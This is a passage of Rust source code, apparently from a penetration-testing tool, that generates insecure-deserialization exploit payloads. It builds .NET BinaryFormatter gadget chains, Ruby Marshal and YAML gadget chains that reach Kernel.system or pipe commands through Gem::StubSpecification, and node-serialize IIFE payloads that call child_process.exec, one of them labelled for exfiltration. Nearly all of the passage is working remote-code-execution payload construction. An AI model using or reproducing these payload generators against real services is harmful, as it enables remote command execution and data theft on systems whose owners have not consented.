    bytes.extend_from_slice(&dotnet_length_prefixed_string("Comparer"));
    bytes.extend_from_slice(&dotnet_length_prefixed_string(command));
    bytes.push(0x0B);

    DeserializationPayload {
        raw_bytes: bytes,
        framework: DeserializationFramework::DotNetBinaryFormatter,
        gadget_chain: GadgetChain::TypeConfuseDelegate,
        command: command.to_string(),
        description: ".NET TypeConfuseDelegate — SortedSet comparison delegate confusion".into(),
    }
}

fn build_windows_identity_payload(command: &str) -> DeserializationPayload {
    let mut bytes = Vec::new();
    bytes.extend_from_slice(&dotnet_serialization_header());
    bytes.push(0x05);
    bytes.extend_from_slice(&1_i32.to_le_bytes());
    bytes.extend_from_slice(&dotnet_length_prefixed_string(
        "System.Security.Claims.ClaimsIdentity",
    ));
    bytes.extend_from_slice(&1_i32.to_le_bytes());
    bytes.extend_from_slice(&dotnet_length_prefixed_string("m_serializedClaims"));
    bytes.extend_from_slice(&dotnet_length_prefixed_string(command));
    bytes.push(0x0B);

    DeserializationPayload {
        raw_bytes: bytes,
        framework: DeserializationFramework::DotNetBinaryFormatter,
        gadget_chain: GadgetChain::WindowsIdentity,
        command: command.to_string(),
        description: ".NET ClaimsIdentity — serialized claims token exploitation".into(),
    }
}

// ---------------------------------------------------------------------------
// Ruby Marshal payloads
// ---------------------------------------------------------------------------

/// Ruby Marshal version header (4.8).
const RUBY_MARSHAL_MAJOR: u8 = 0x04;
const RUBY_MARSHAL_MINOR: u8 = 0x08;

/// Marshal type byte for object.
const MARSHAL_OBJECT: u8 = b'o';
/// Marshal type byte for symbol.
const MARSHAL_SYMBOL: u8 = b':';
/// Marshal type byte for string (IVAR).
const MARSHAL_IVAR: u8 = b'I';
/// Marshal type byte for raw string.
const MARSHAL_STRING: u8 = b'"';

fn marshal_fixnum(n: i32) -> Vec<u8> {
    if n == 0 {
        return vec![0];
    }
    if (1..=122).contains(&n) {
        return vec![(n + 5) as u8];
    }
    if (-123..=-1).contains(&n) {
        return vec![(n - 5) as u8];
    }
    // Multi-byte encoding for larger values
    let mut buf = Vec::new();
    if n > 0 {
        let bytes = n.to_le_bytes();
        let len = if n <= 0xFF {
            1
        } else if n <= 0xFFFF {
            2
        } else if n <= 0xFFFFFF {
            3
        } else {
            4
        };
        buf.push(len);
        buf.extend_from_slice(&bytes[..len as usize]);
    } else {
        let bytes = n.to_le_bytes();
        let len = if n >= -0x100 {
            1
        } else if n >= -0x10000 {
            2
        } else if n >= -0x1000000 {
            3
        } else {
            4
        };
        buf.push((-len) as u8);
        buf.extend_from_slice(&bytes[..len as usize]);
    }
    buf
}

fn marshal_symbol(name: &str) -> Vec<u8> {
    let mut buf = Vec::new();
    buf.push(MARSHAL_SYMBOL);
    buf.extend_from_slice(&marshal_fixnum(name.len() as i32));
    buf.extend_from_slice(name.as_bytes());
    buf
}

fn marshal_string(s: &str) -> Vec<u8> {
    let mut buf = Vec::new();
    buf.push(MARSHAL_IVAR);
    buf.push(MARSHAL_STRING);
    buf.extend_from_slice(&marshal_fixnum(s.len() as i32));
    buf.extend_from_slice(s.as_bytes());
    // Instance variable count = 1 (encoding)
    buf.extend_from_slice(&marshal_fixnum(1));
    buf.extend_from_slice(&marshal_symbol("E"));
    // True (encoding = UTF-8)
    buf.push(b'T');
    buf
}

fn generate_ruby_payloads(command: &str) -> Vec<DeserializationPayload> {
    vec![
        build_erb_template_payload(command),
        build_universal_rce_payload(command),
        build_yaml_deser_payload(command),
    ]
}

fn build_erb_template_payload(command: &str) -> DeserializationPayload {
    let erb_template = format!("<%= `{}` %>", command);
    let mut bytes = Vec::new();
    bytes.push(RUBY_MARSHAL_MAJOR);
    bytes.push(RUBY_MARSHAL_MINOR);
    bytes.push(MARSHAL_OBJECT);
    bytes.extend_from_slice(&marshal_symbol("Gem::Requirement"));
    // Instance variable count
    bytes.extend_from_slice(&marshal_fixnum(1));
    bytes.extend_from_slice(&marshal_symbol("requirements"));
    bytes.extend_from_slice(&marshal_string(&erb_template));

    DeserializationPayload {
        raw_bytes: bytes,
        framework: DeserializationFramework::RubyMarshal,
        gadget_chain: GadgetChain::ErbTemplateInjection,
        command: command.to_string(),
        description: "Ruby Gem::Requirement — ERB template injection via Marshal.load".into(),
    }
}

fn build_universal_rce_payload(command: &str) -> DeserializationPayload {
    let mut bytes = Vec::new();
    bytes.push(RUBY_MARSHAL_MAJOR);
    bytes.push(RUBY_MARSHAL_MINOR);
    bytes.push(MARSHAL_OBJECT);
    bytes.extend_from_slice(&marshal_symbol("Gem::StubSpecification"));
    bytes.extend_from_slice(&marshal_fixnum(2));
    bytes.extend_from_slice(&marshal_symbol("loaded_from"));
    bytes.extend_from_slice(&marshal_string(&format!("| {}", command)));
    bytes.extend_from_slice(&marshal_symbol("name"));
    bytes.extend_from_slice(&marshal_string("exploit"));

    DeserializationPayload {
        raw_bytes: bytes,
        framework: DeserializationFramework::RubyMarshal,
        gadget_chain: GadgetChain::UniversalRceGadget,
        command: command.to_string(),
        description: "Ruby Gem::StubSpecification — universal RCE via loaded_from pipe".into(),
    }
}

fn build_yaml_deser_payload(command: &str) -> DeserializationPayload {
    let yaml_payload = format!(
        "--- !ruby/object:Gem::Installer\ni: x\n--- !ruby/object:Gem::SpecFetcher\ni: y\n--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Package::TarReader\n  io: &1 !ruby/object:Net::BufferedIO\n    io: &1 !ruby/object:Gem::Package::TarReader::Entry\n       read: 0\n       header: \"abc\"\n    debug_output: &1 !ruby/object:Net::WriteAdapter\n       socket: &1 !ruby/object:Gem::RequestSet\n           sets: !ruby/object:Net::WriteAdapter\n               socket: !ruby/module 'Kernel'\n               method_id: :system\n           git_set: {{}}\n       method_id: :resolve\n  type: \"{}\"",
        command
    );

    let mut bytes = Vec::new();
    bytes.push(RUBY_MARSHAL_MAJOR);
    bytes.push(RUBY_MARSHAL_MINOR);
    bytes.extend_from_slice(&marshal_string(&yaml_payload));

    DeserializationPayload {
        raw_bytes: bytes,
        framework: DeserializationFramework::RubyMarshal,
        gadget_chain: GadgetChain::YamlDeserialization,
        command: command.to_string(),
        description: "Ruby YAML.load → Marshal.load bridge — nested gadget chain".into(),
    }
}

// ---------------------------------------------------------------------------
// Node.js node-serialize payloads
// ---------------------------------------------------------------------------

fn generate_node_payloads(command: &str) -> Vec<DeserializationPayload> {
    vec![
        build_iife_payload(command),
        build_function_constructor_payload(command),
        build_node_child_process_payload(command),
    ]
}

fn build_iife_payload(command: &str) -> DeserializationPayload {
    let payload = format!(
        r#"{{"rce":"_$$ND_FUNC$$_function(){{require('child_process').exec('{}')}}()"}}"#,
        escape_js_string(command),
    );

    DeserializationPayload {
        raw_bytes: payload.into_bytes(),
        framework: DeserializationFramework::NodeSerialize,
        gadget_chain: GadgetChain::IifeExecution,
        command: command.to_string(),
        description: "node-serialize IIFE — child_process.exec via _$$ND_FUNC$$_".into(),
    }
}

fn build_function_constructor_payload(command: &str) -> DeserializationPayload {
    let payload = format!(
        r#"{{"rce":"_$$ND_FUNC$$_new Function('return require(\\'child_process\\').execSync(\\'{}\\').toString()')()"}}"#,
        escape_js_string(command),
    );

    DeserializationPayload {
        raw_bytes: payload.into_bytes(),
        framework: DeserializationFramework::NodeSerialize,
        gadget_chain: GadgetChain::FunctionConstructor,
        command: command.to_string(),
        description: "node-serialize Function constructor — execSync via new Function".into(),
    }
}

fn build_node_child_process_payload(command: &str) -> DeserializationPayload {
    let payload = format!(
        r#"{{"rce":"_$$ND_FUNC$$_function(){{var cp=require('child_process');cp.exec('{}',function(e,o,s){{/* exfil */}})}}()"}}"#,
        escape_js_string(command),
    );

    DeserializationPayload {
        raw_bytes: payload.into_bytes(),
        framework: DeserializationFramework::NodeSerialize,
        gadget_chain: GadgetChain::NodeChildProcess,
        command: command.to_string(),
        description: "node-serialize child_process — exec with callback for exfiltration".into(),
    }
}

fn escape_js_string(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('\'', "\\'")
        .replace('"', "\\\"")
}

fn url_encode_bytes(bytes: &[u8]) -> String {
    let mut encoded = String::with_capacity(bytes.len() * 3);
    for &byte in bytes {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                encoded.push(byte as char);
            }
            _ => {
                encoded.push('%');
                encoded.push_str(&format!("{:02X}", byte));
            }
        }
    }
    encoded
}
